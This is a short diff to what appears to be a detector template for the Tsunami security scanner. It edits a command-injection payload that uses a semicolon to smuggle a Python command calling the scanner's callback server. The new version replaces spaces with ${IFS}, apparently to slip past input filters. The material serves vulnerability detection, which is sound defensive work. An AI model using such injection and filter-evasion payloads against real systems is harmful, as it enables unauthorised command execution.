@@ -106,7 +106,7 @@ workflows: {
   condition: REQUIRES_CALLBACK_SERVER
   variables: [
     { name: "session_hash" value: "tsunami{{ T_UTL_CURRENT_TIMESTAMP_MS }}" },
-    { name: "payload" value: "a;python -c \"import urllib.request; print(urllib.request.urlopen('{{ T_CBS_URI }}').read().decode())\";b" }
+    { name: "payload" value: "a;python${IFS}-c${IFS}\\\"urllib=__import__('urllib.request');print(urllib.request.urlopen('{{ T_CBS_URI }}').read().decode())\\\";b" }
   ]
 
   actions: [
